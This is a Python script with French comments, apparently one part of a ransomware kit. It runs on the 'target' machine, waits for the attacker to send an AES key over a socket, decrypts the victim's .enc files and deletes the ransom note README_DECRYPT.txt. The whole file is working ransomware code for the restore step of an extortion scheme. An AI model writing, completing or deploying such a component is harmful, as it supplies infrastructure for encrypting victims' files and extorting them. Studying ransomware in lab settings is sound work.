#!/usr/bin/env python3
"""
decryptserver.py — Serveur de déchiffrement (à lancer sur la TARGET)
Attend la clé AES de l'attaquant et déchiffre les fichiers localement.

Usage: python3 decryptserver.py <dossier> [port]
Ex:    python3 decryptserver.py /home/victim/documents 7777
"""

import sys
import os
import socket
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding

PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 7777

# ── Déchiffrement d'un fichier .enc ──────────────────────────────────────────
def decrypt_file(enc_path, aes_key):
    with open(enc_path, "rb") as f:
        data = f.read()

    iv         = data[:16]       # les 16 premiers bytes = IV
    ciphertext = data[16:]       # le reste = données chiffrées

    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    padded = decryptor.update(ciphertext) + decryptor.finalize()

    unpadder  = sym_padding.PKCS7(128).unpadder()
    plaintext = unpadder.update(padded) + unpadder.finalize()

    original_path = enc_path[:-4]  # retire .enc
    with open(original_path, "wb") as f:
        f.write(plaintext)

    os.remove(enc_path)
    return original_path

# ── Déchiffrement de tout le dossier ─────────────────────────────────────────
def decrypt_directory(directory, aes_key):
    count = 0
    for root, _, files in os.walk(directory):
        for fname in files:
            if not fname.endswith(".enc"):
                continue
            full_path = os.path.join(root, fname)
            try:
                original = decrypt_file(full_path, aes_key)
                print(f"  [+] {fname} → {os.path.basename(original)}")
                count += 1
            except Exception as e:
                print(f"  [!] Erreur sur {fname}: {e}")
    return count

# ── Main ─────────────────────────────────────────────────────────────────────
def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <dossier> [port]")
        sys.exit(1)

    directory = sys.argv[1]

    if not os.path.isdir(directory):
        print(f"[!] Dossier introuvable : {directory}")
        sys.exit(1)

    print(f"[*] Decrypt server en écoute sur 0.0.0.0:{PORT}")
    print(f"[*] Dossier cible : {directory}")
    print(f"[*] En attente de la clé AES de l'attaquant...\n")

    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", PORT))
    s.listen(1)

    conn, addr = s.accept()
    print(f"[+] Connexion reçue de {addr[0]}")

    # Reçoit le payload JSON
    data = b""
    while True:
        chunk = conn.recv(4096)
        if not chunk:
            break
        data += chunk
    conn.close()
    s.close()

    payload = json.loads(data.decode().strip())
    aes_key_hex = payload["aes_key"]
    aes_key     = bytes.fromhex(aes_key_hex)
    print(f"[+] Clé AES reçue ({len(aes_key)*8} bits)")

    print(f"[*] Déchiffrement de {directory}...")
    count = decrypt_directory(directory, aes_key)

    # Supprime la note de rançon
    note = os.path.join(directory, "README_DECRYPT.txt")
    if os.path.exists(note):
        os.remove(note)
        print(f"[+] Note de rançon supprimée")

    print(f"\n[+] {count} fichier(s) déchiffré(s) avec succès")
    print(f"[+] Vos fichiers ont été restaurés.")

if __name__ == "__main__":
    main()
